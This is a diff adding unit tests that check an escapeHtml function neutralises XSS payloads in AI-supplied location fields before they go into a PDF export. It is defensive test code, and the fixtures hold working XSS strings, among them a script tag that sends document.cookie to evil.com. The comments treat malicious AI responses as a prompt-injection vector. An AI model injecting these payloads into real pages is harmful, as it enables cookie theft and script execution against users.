@@ -291,6 +291,53 @@ describe('askClaude error handling (logic)', () => {
   });
 });
 
+// ── PDF export: AI-returned location data must be escaped ─────────────────
+// The PDF is generated via document.write() in a new window. AI-provided
+// location fields (name, region, whyYou, tags) must be escaped before
+// insertion to prevent prompt-injection XSS via a malicious AI response.
+describe('escapeHtml — PDF export pen-tests (AI location data)', () => {
+  it('escapes a city name containing a script tag (prompt injection vector)', () => {
+    const maliciousName = 'Pune<script>fetch("https://evil.com?c="+document.cookie)</script>';
+    const safe = escapeHtml(maliciousName);
+    expect(safe).not.toContain('<script>');
+    expect(safe).toContain('&lt;script&gt;');
+  });
+
+  it('escapes a region field containing an event-handler injection', () => {
+    const maliciousRegion = 'India" onload="alert(1)';
+    const safe = escapeHtml(maliciousRegion);
+    expect(safe).not.toContain('"');
+    expect(safe).toContain('&quot;');
+  });
+
+  it('escapes whyYou text containing an img onerror vector', () => {
+    const maliciousWhyYou = 'Great city <img src=x onerror=alert(document.domain)> for retirement';
+    const safe = escapeHtml(maliciousWhyYou);
+    expect(safe).not.toContain('<img');
+    expect(safe).toContain('&lt;img');
+  });
+
+  it('escapes a tag string containing a closing-tag breakout attempt', () => {
+    const maliciousTag = '</span><script>alert(1)</script><span>';
+    const safe = escapeHtml(maliciousTag);
+    expect(safe).not.toContain('</span>');
+    expect(safe).not.toContain('<script>');
+    expect(safe).toContain('&lt;/span&gt;');
+  });
+
+  it('escapes a whyYou with SVG-based XSS vector', () => {
+    const maliciousWhyYou = '<svg onload=alert(1)>';
+    const safe = escapeHtml(maliciousWhyYou);
+    expect(safe).not.toContain('<svg');
+    expect(safe).toContain('&lt;svg');
+  });
+
+  it('safely handles a normal city name with no modification', () => {
+    expect(escapeHtml('Mysuru')).toBe('Mysuru');
+    expect(escapeHtml('Pondicherry')).toBe('Pondicherry');
+  });
+});
+
 // ── calcFinancials edge cases ──────────────────────────────────────────────
 describe('calcFinancials — edge cases', () => {
   it('handles very large corpus goal without overflow', () => {
